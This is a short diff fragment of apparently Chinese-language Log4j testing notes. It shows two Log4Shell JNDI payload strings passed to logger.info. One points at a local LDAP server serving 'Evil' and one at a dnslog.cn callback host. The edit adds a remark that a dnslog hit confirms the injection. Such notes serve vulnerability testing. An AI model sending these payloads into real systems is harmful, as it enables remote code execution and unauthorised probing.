@@ -28,6 +28,6 @@ logger.info("${jndi:ldap://127.0.0.1:1099/Evil}");
 ```
 
 ```
-仅测试dnslog即可
+仅测试dnslog即可，一般有结果就一定存在注入
 logger.info("${jndi:ldap://xx.dnslog.cn}");
 ```
